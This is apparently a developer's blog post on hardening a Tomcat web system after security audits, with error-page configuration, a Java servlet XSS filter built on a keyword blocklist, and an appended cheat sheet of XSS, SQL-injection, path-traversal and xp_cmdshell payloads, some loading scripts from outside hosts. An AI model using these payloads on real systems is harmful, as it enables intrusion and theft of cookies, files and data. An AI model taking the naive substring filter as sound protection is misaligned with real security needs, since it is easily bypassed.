---
layout: default
title: 公司web安全等级提升
category: [Technology, Xss]
comments: true
---


# 背景介绍
公司的一个web数据展示系统,本来是内网的,而且是一个单独的主机,不存在远程控制的问题,所以之前并没有考虑一些安全相关的测试.但是国调安全检查的需要添加这样子的一层防护措施,所以还是不得不添加一下.
仔细想一下,如果内网机被人意外连接网线,确实是会存在被入侵的可能,所以还是添加一下为好.









# 目录

[TOC]



# 针对国调的初次测试结果
初次测试有两份报告,一个是渗透测试报告,一个是安全测试报告,不明白为什么有两份,但是需要整改的有如下几点:

* 1存在未授权访问漏洞，攻击者利用此漏洞可以直接系统的管理员功能模块。web界面需要登录之后才可以使用,需要添加一个登录界面.如未设置严格的登录认证，可直接访问系统功能模块，造成敏感信息泄露。

* 2主机存在冗余页面。

* 3Web服务存在敏感信息泄漏、Tomcat中间件信息以及版本信息泄漏.

## 解决方案

针对第1点,刚刚开始时候,工程人员并没有给测试的文档,只说说要一个登录界面.使用系统的时候必须登录之后才可以使用.好吧,我的直接把操作数据库时候的权限的登录直接拿过来了.

发过去之后工程说还是不合格最后才总算是吧文档发过来了,原来是登录不够严格,直接输入登录验证成功之后的网址,就可以不用登录了.于是在登录界面直接设置一个cookie了,没有的话就全部返回到登录界面.

但是有一个问题,这个界面现在完全只是内网使用的,而且一般都是独立的一台电脑,因此这个界面是否有必要使用,还是未知状态.

针对第2点,那些冗余界面是啥,是tomcat的默认配置文件,没得说自己删除吧,不会?自己百度一下怎么删除tomcat的默认界面文件吧.

针对第3点,这个是tomcat和web都没有配置错误界面导致的,添加这么一个配置就行,直接在web.xml文件里面添加了下面的东西了.

```js
<error-page>
    <error-code>401</error-code>
    <location>/WEB-INF/error.html</location>
  </error-page>
  <error-page>
    <error-code>403</error-code>
    <location>/WEB-INF/error.html</location>
  </error-page>
  <error-page>
    <error-code>404</error-code>
    <location>/WEB-INF/error.html</location>
  </error-page>
  <error-page>
    <error-code>500</error-code>
    <location>/WEB-INF/error.html</location>
  </error-page>
```

然后web-inf目录下面的这个error.html文件就如下代码了,至于图片就自己随便找个了,这样子就替换了中间件的信息了:

```html
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
    <title>系统出现错误，我们会尽快修复，对您造成不便我们感到非常抱歉。</title>
    <style type="text/css">
        .ui-error-box{
 
            background-image: url(/images/error_bj.jpg); height:260px; width: 410px; margin: 80px auto;
            color: #eb6100; font-weight: bold; padding: 140px 0 0 198px;
         
}
        .ui-error-box a{
 			color: #037cd6; margin-right: 20px;
}
 
    </style>
</head>
<body>
    <div class="ui-error-box">
        <p>资源不存在或者系统内部错误<br>对您造成不便我们感到非常抱歉。</p>
    </div>
</body> 
```

补充一点的是如果你的web可以访问外网,可以在页面里面添加如下的js,实现腾讯公益的404界面.
```js
<script type="text/javascript" src="//qzonestyle.gtimg.cn/qzone/hybrid/app/404/search_children.js" charset="utf-8" homePageUrl="http://yoursite.com/yourPage.html" homePageName="回到我的主页"></script>
```

# 二次测试
二次测试的结果并没有文档,只是说有一些xss漏洞和一些注入漏洞.问了现场人员有哪些页面,结果听了半天只是听明白了一个,好吧,自己慢慢弄了.

针对这个,由于有不少的页面,直接的打算是通过filter,过滤所有的xss关键字段和注入字段了.然后需要的代码如下:

```java
//XssFilter.java
import java.io.IOException;
import javax.servlet.Filter;
import javax.servlet.FilterChain;
import javax.servlet.FilterConfig;
import javax.servlet.ServletException;
import javax.servlet.ServletRequest;
import javax.servlet.ServletResponse;
import javax.servlet.http.HttpServletRequest;

/**
 * 
 * @author wk
 * @date 2018-8-11
 */
public class XssFilter implements Filter {
	@Override
	public void destroy() {
 
	}
 
	@Override
	public void doFilter(ServletRequest request, ServletResponse response,
			FilterChain chain) throws IOException, ServletException {
		chain.doFilter(new XssHttpServletRequestWraper(
                (HttpServletRequest)request), response);//对request和response进行过滤
	}
 
	@Override
	public void init(FilterConfig arg0) throws ServletException {
 
	}
}
```

```java
//XssHttpServletRequestWraper.java
import java.io.UnsupportedEncodingException;
import java.net.URLDecoder;
import java.util.regex.Pattern;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletRequestWrapper;

/**
 * 
 * @author wk
 * @date 2018-8-11
 */
public class XssHttpServletRequestWraper extends HttpServletRequestWrapper {
	HttpServletRequest orgRequest = null;

	public XssHttpServletRequestWraper(HttpServletRequest request) {
		super(request);
		orgRequest = request;
	}

	@Override
	public String getParameter(String name) {
		return clearXss(super.getParameter(name));
	}

	@Override
	public String getHeader(String name) {
		return clearXss(super.getHeader(name));
	}

	@Override
	public String[] getParameterValues(String name) {
		String[] values = super.getParameterValues(name);
		if (values == null) {
			return null;
		}
		String[] newValues = new String[values.length];

		for (int i = 0; i < values.length; i++) {
			newValues[i] = clearXss(values[i]);
		}

		return newValues;
	}

	/**
	 * 处理字符转义
	 * 
	 * @param value
	 * @return
	 */
	private String clearXss(String value) {
		if (value == null || "".equals(value)) {
			return value;
		}
		try {
			value = value.replace("+", "%2B"); // '+' replace to '%2B'
			//value = URLDecoder.decode(value, "utf-8");
			value = value.replace("+", "%2B"); // '+' replace to '%2B'
			for(int i=0,j=value.lastIndexOf('%');i!=j;){//"if the % should in it , -1 cannot work update20180821"
				value = URLDecoder.decode(value, "utf-8");
				i=j;
				j=value.lastIndexOf('%');
			}
		} catch (UnsupportedEncodingException e) {
		} catch (IllegalArgumentException e) {
		}

		// Avoid null characters
		value = value.replaceAll("\0", "");//过滤空字符

		value = value.replaceAll("\\(", "(").replace("\\)", ")");//过滤转码的括号
		value = value.replaceAll("eval\\((.*)\\)", "");//过滤eval函数
		value = value.replaceAll("[\\\"\\\'][\\s]*javascript:(.*)[\\\"\\\']","\"\"");//过滤脚本函数
		value = value.replace("script", "");//过滤脚本
		value = value.replace("alert", "");//过滤弹窗
		value = value.replace("iframe", "");//过滤页面跳转
		value = value.replace("meta", "");//过滤mete属性跳转
		value = value.replace("http", "");//过滤连接替换
		value = value.replace("link", "");//过滤连接替换
		value = value.replace("title", "");//过滤修改标题
		value = value.replace("style", "");//过滤style的xss
		value = value.replace("head", "");//过滤头部文件的更改
		value = value.replace("object", "");//过滤object类型的页面注入
		value = value.replace("div", "");//过滤添加div操作
		value = value.replace("span", "");//过滤添加span操作
		value = value.replace("--", "");//过滤数据库的省略注释

		// Avoid anything in a src='...' type of e­xpression
		// Pattern scriptPattern =
		// Pattern.compile("src[\r\n]*=[\r\n]*\\\'(.*?)\\\'",
		// Pattern.CASE_INSENSITIVE | Pattern.MULTILINE | Pattern.DOTALL);
		Pattern scriptPattern = Pattern.compile("src[\r\n]*=",
				Pattern.CASE_INSENSITIVE | Pattern.MULTILINE | Pattern.DOTALL);
		value = scriptPattern.matcher(value).replaceAll("");
		
		 scriptPattern = Pattern.compile("href[\r\n]*=",
				Pattern.CASE_INSENSITIVE | Pattern.MULTILINE | Pattern.DOTALL);
		value = scriptPattern.matcher(value).replaceAll("");

		// Avoid onload= e­xpressions
		scriptPattern = Pattern.compile("\\son(.*?)=", Pattern.CASE_INSENSITIVE
				| Pattern.MULTILINE | Pattern.DOTALL);
		value = scriptPattern.matcher(value).replaceAll("");

		// // Avoid e­xpression(...) e­xpressions
		 scriptPattern = Pattern.compile("expression\\((.*?)\\)",
		 Pattern.CASE_INSENSITIVE | Pattern.MULTILINE | Pattern.DOTALL);
		// code would become error

		value = scriptPattern.matcher(value).replaceAll("");

		// return xssEncode(value);//xml will error for chars
		System.out.println("xss:"+value);
		if(value.toLowerCase().contains("ecode")){
			if(value.toLowerCase().contains("login")){
				value = value.replace("\'", "");
			}
		}else{
			value = xssEncode(value);
		}
		return value;
	}

	/**
	 * 将容易引起xss漏洞的半角字符直接替换成全角字符
	 * 
	 * @param s
	 * @return
	 */
	private static String xssEncode(String s) {
		if (s == null || s.isEmpty()) {
			return s;
		}
		StringBuilder sb = new StringBuilder(s.length() + 16);
		for (int i = 0; i < s.length(); i++) {
			char c = s.charAt(i);
			switch (c) {
			case '>':
				sb.append('＞');// 全角大于号
				break;
			case '<':
				sb.append('＜');// 全角小于号
				break;
			case '\'':
				sb.append('‘');// 全角单引号
				break;
			case '\"':
				sb.append('“');// 全角双引号
				break;
			case '&':
				sb.append('＆');// 全角
				break;
			case '\\':
				sb.append('＼');// 全角斜线
				break;
//			case '#':
//				sb.append('＃');// 全角井号
//				break;
//ecode节点内部采用#作为分隔符,不可转码
			case '%': // < 字符的 URL 编码形式表示的 ASCII 字符（十六进制格式） 是: %3c
				processUrlEncoder(sb, s, i);
				break;
			default:
				sb.append(c);
				break;
			}
		}
		return sb.toString();
	}

	public static void processUrlEncoder(StringBuilder sb, String s, int index) {
		if (s.length() >= index + 2) {
			if (s.charAt(index + 1) == '3'
					&& (s.charAt(index + 2) == 'c' || s.charAt(index + 2) == 'C')) { // %3c,
																						// %3C
				sb.append('＜');
				return;
			}
			if (s.charAt(index + 1) == '6' && s.charAt(index + 2) == '0') { // %3c
																			// (0x3c=60)
				sb.append('＜');
				return;
			}
			if (s.charAt(index + 1) == '3'
					&& (s.charAt(index + 2) == 'e' || s.charAt(index + 2) == 'E')) { // %3e,
																						// %3E
				sb.append('＞');
				return;
			}
			if (s.charAt(index + 1) == '6' && s.charAt(index + 2) == '2') { // %3e
																			// (0x3e=62)
				sb.append('＞');
				return;
			}
		}
		sb.append(s.charAt(index));
	}

	/**
	 * 获取最原始的request
	 * 
	 * @return
	 */
	public HttpServletRequest getOrgRequest() {
		return orgRequest;
	}

	// /**
	// * 获取最原始的request的静态方法
	// *
	// * @return
	// */
	// public static HttpServletRequest getOrgRequest(HttpServletRequest req) {
	// if (req instanceof XssHttpServletRequestWrapper) {
	// return ((XssHttpServletRequestWrapper) req).getOrgRequest();
	// }
	// return req;
	// }

}
```

上面的两个是java的类,下面还需要添加对应的filter节点就行了.

```xml
  <filter>
  	<filter-name>XssFilter</filter-name>
  	<filter-class>XX.XX.XX.xss.XssFilter</filter-class>
  </filter>
  <filter-mapping>
  	<filter-name>XssFilter</filter-name>
  	<url-pattern>/*</url-pattern>
  </filter-mapping>
```

完成这个,基本常用的一些xss是拦住了.


# 关于XSS

## 什么是XSS
XSS攻击全称跨站脚本攻击，是为不和层叠样式表(Cascading Style Sheets, CSS)的缩写混淆，故将跨站脚本攻击缩写为XSS，
XSS是一种在web应用中的计算机安全漏洞，它允许恶意web用户将代码植入到提供给其它用户使用的页面中。
一般而言,如果存在xss漏洞,在完成正常文本之后,添加对应的结束标记,在添加形如`<script>alert('XSS')</script>`的代码,
如果访问时候能够出现弹窗,即可实现获取其他用户的信息的操作,危害不小.

## 基本防御
传统XSS防御多采用特征匹配方式，在所有提交的信息中都进行匹配检查。
对于这种类型的XSS攻击，采用的模式匹配方法一般会需要对“javascript”这个关键字进行检索，也可以添加其他的关键字进行过滤,
一旦发现提交信息中包含“javascript”，就认定为XSS攻击。
这种检测方法的缺陷显而易见：骇客可以通过插入字符或完全编码的方式躲避检测：
躲避方法1)在javascript中加入多个tab键，得到

```
< IMG SRC="jav ascript:alert('XSS');" >;
```

躲避方法2) 在javascript中加入(空格)字符，得到
```
< IMG SRC="javascri pt:alert('XSS');" >;
```
躲避方法3) 在javascript中加入(回车)字符，得到
```
< IMG SRC="jav
ascript:alert('XSS');" >;
```
躲避方法4)在javascript中的每个字符间加入回车换行符，得到
```
< IMG SRC="javascrip\r
\nt:alert('XSS');" >
```
躲避方法5)对"javascript:alert('XSS')"采用完全编码，得到
```
< IMGSRC=javascrip?74:alert('XSS') >
```
上述方法都可以很容易的躲避基于特征的检测。而除了会有大量的漏报外，基于特征的
还存在大量的误报可能：在上面的例子中，对上述某网站这样一个地址，由于包含了关键字“javascript”，也将会触发报警。

## 代码防御

和SQL注入防御一样，XSS攻击也是利用了Web页面的编写疏忽，所以还有一种方法就是从Web应用开发的角度来避免：

步骤1、对所有用户提交内容进行可靠的输入验证，包括对URL、查询关键字、HTTP头、POST数据等，仅接受指定长度范围内、采用适当格式、采用所预期的字符的内容提交，对其他的一律过滤。

步骤2、实现Session标记(session tokens)、CAPTCHA系统或者HTTP引用头检查，以防功能被第三方网站所执行。

步骤3、确认接收的的内容被妥善的规范化，仅包含最小的、安全的Tag(没有javascript)，去掉任何对远程内容的引用(尤其是样式表和javascript)，使用HTTP only的cookie。

当然，如上操作将会降低Web业务系统的可用性，用户仅能输入少量的制定字符，人与系统间的交互被降到极致，
仅适用于信息发布型站点。并且考虑到很少有Web编码人员受过正规的安全培训，很难做到完全避免页面中的XSS漏洞。

## xss代码辑录
```
//界面弹窗
<script>alert(document.cookie)</script>
<script>alert(vulnerable)</script>
<script>alert(125)</script>
<script>alert('XSS')</script>
<SCRIPT>document.write("<SCRI");</SCRIPT>PT src="http://xss.ha.ckers.org/a.js"></SCRIPT>
<SCRIPT a=">" '' src="http://xss.ha.ckers.org/a.js"></SCRIPT>
<SCRIPT>a=/XSS/alert(a.source)</SCRIPT>
<SCRIPT src="http://xss.ha.ckers.org/xss.jpg"></SCRIPT>
%22%3E%3Cscript%3Ealert(document.cookie)%3C/script%3E
%3Cscript%3Ealert('XSS')%3C/script%3E
%22%3cscript%3ealert(%22xss%22)%3c/script%3e
%0a%0a<script>alert(\"Vulnerable\")</script>.jsp
%3cscript%3ealert(%22xss%22)%3c/script%3e/index.html
%3c/title%3e%3cscript%3ealert(%22xss%22)%3c/script%3e
%3Cscript%3Ealert(document. domain);%3C/script%3E&
%3Cscript%3Ealert(document.domain);%3C/script%3E&SESSION_ID={SESSION_ID}&SESSION_ID=
<script>window.open('http://www.pete.cn /default.asp','newwindow','width=200,height=200');</script>

<img src=x onerror=alert(123)>
<img src="javascript:alert('XSS')">
<IMG src=JaVaScRiPt:alert('XSS')>
<IMG src="jav ascript:alert('XSS');">
"<IMG src=java\0script:alert(\"XSS\")>";' > 
<IMG src='vbscript:msgbox("XSS")'>
<IMG src="mocha:[code]">
<IMG src="livescript:[code]">
<IMG DYNSRC="javascript:alert('XSS')">
<IMG LOWSRC="javascript:alert('XSS')">
<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>
<IMG src="http://www.thesiteyouareon.com/somecommand.php?somevariables=maliciouscode">
<IMG STYLE='xss:expre\ssion(alert("XSS"))'>
<IMG src=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>

<BODY BACKGROUND="javascript:alert('XSS')">
<BODY ONLOAD=alert('XSS')>
<BODY%20onload!#$%&()*~+-_.,:;?@[/|\]^`=alert(“XSS”)>

<a href="http://www.baidu.com">百度</a>
<A href=http://www.gohttp://www.google.com/ogle.com/>link</A>

<META HTTP-EQUIV=”refresh” CONTENT=”0; URL=http://;URL=java:alert(‘XSS’);”>
<META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:alert('XSS');">

<LINK REL="stylesheet" href="javascript:alert('XSS');">

<STYLE TYPE="text/javascript">alert('XSS');</STYLE>
<STYLE TYPE="text/css">.XSS{background-image:url("javascript:alert('XSS')");}</STYLE><A class="XSS"></A>
<STYLE type="text/css">BODY{background:url("javascript:alert('XSS')")}</STYLE>
<STYLE>@im\port'\ja\vasc\ript:alert("XSS")';</STYLE>

<DIV STYLE="background-image: url(javascript:alert('XSS'))">
<DIV STYLE="behaviour: url('http://www.how-to-hack.org/exploit.html');">
<DIV STYLE="width: expression(alert('XSS'));">

<BGSOUND src="javascript:alert('XSS');">
<br size="&{alert('XSS')}">
<LAYER src="http://xss.ha.ckers.org/a.js"></layer>
<p><svg onload=prompt(/xss/)></p>   //遇到过这种情况
<IFRAME src=javascript:alert('XSS')></IFRAME>
<FRAMESET><FRAME src=javascript:alert('XSS')></FRAME></FRAMESET>
<TABLE BACKGROUND="javascript:alert('XSS')">
<XML src="javascript:alert('XSS');">
<BODY ONLOAD="a();"><SCRIPT>function a(){alert('XSS');}</SCRIPT>
<BASE href="javascript:alert('XSS');//">
getURL("javascript:alert('XSS')")

a="get";b="URL";c="javascript:";d="alert('XSS');";eval(a+b+c+d);
?sql_debug=1
%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
%2E%2E/%2E%2E/%2E%2E/%2E%2E/%2E%2E/windows/win.ini
';exec%20master..xp_cmdshell%20'dir%20 c:%20>%20c:\inetpub\wwwroot\?.txt'--&&
1%20union%20all%20select%20pass,0,0,0,0%20from%20customers%20where%20fname=
http://www.cnblogs.com/http://www.cnblogs.com/http://www.cnblogs.com/http://www.cnblogs.com/etc/passwd
..\..\..\..\..\..\..\..\windows\system.ini
\..\..\..\..\..\..\..\..\windows\system.ini
'';!--"<XSS>=&{()}
<!--#exec cmd="/bin/echo '<SCRIPT SRC'"--><!--#exec cmd="/bin/echo '=http://xss.ha.ckers.org/a.js></SCRIPT>'"-->

<script language="JavaScript">
<!--
while (true)
{
window.open("URI"); //如果URI就是当前页本身，那就更具破坏性。
}
//-->
</script>

<script language="VBScript">
Set RegWsh = CreateObject("WScript.Shell");
//设置IE浏览器默认页
RegWsh.RegWrite("HKCU\Software\Microsoft\Internet Explorer\Main\Start Page", "http://www.attacker.com");
</script>



///注入部分
admin'--

' or 0=0 --
" or 0=0 --
or 0=0 --

' or 0=0 #
" or 0=0 #
or 0=0 #

' or 'x'='x
" or "x"="x
') or ('x'='x

' or 1=1--
" or 1=1--
or 1=1--

' or a=a--
" or "a"="a
') or ('a'='a
") or ("a"="a

hi" or "a"="a
hi" or 1=1 --
hi' or 1=1 --
hi' or 'a'='a
hi') or ('a'='a
hi") or ("a"="a[/code]

' or 1<>2 --

```

注入部分可以详见[SQL注入语句大全](https://wangkun19930608.github.io/texhnology/inject/2018/08/15/inject1/)

更多xss利用可以参考[XSS跨站脚本攻击全方位学习教程](http://www.hekaiyu.cn/xss/272.html)

在线转码工具可以使用这个:[XSS'OR_Hack with JavaScript](http://xssor.io/ )




# 说明
开发时候软件版本为1.44版本的web展示项目部分,后面同步更新到3.0的web部分.

[欢迎评论，欢迎指正,转载也请注明出处.](https://wangkun19930608.github.io/technology/xss/2018/08/11/company-xss/)

## 参考文章

[XSS 防御方法总结](http://www.cnblogs.com/digdeep/p/4695348.html)

[配置过滤器filter对跨站脚本攻击XSS实现拦截](https://blog.csdn.net/zougangx/article/details/53261820)

[springMVC通过Filter实现防止xss注入](https://blog.csdn.net/qq924862077/article/details/62053577)

[Java中使用Springmvc拦截器拦截XSS攻击（XSS拦截）](https://blog.csdn.net/starry7953810/article/details/79850865)

[XSS跨站脚本小结](https://www.cnblogs.com/xiaozi/p/5588099.html)

[经典XSS跨站脚本集合汇总整理](https://blog.csdn.net/lizhengnanhua/article/details/38451683)

[XSS攻击常用脚本](https://blog.csdn.net/zxchhyg/article/details/72830260)

[XSS跨站测试代码大全](http://www.cnblogs.com/dsky/archive/2012/04/06/2434768.html)

[XSS攻击_百度百科](https://baike.baidu.com/item/XSS%E6%94%BB%E5%87%BB/954065)



## 版本记录

20180810 开始代码动工

20180811 完成项目代码

20180814 完成文章


20180821 被url转码后的sql注入过滤,添加特殊节点过滤,添加转码工具网址
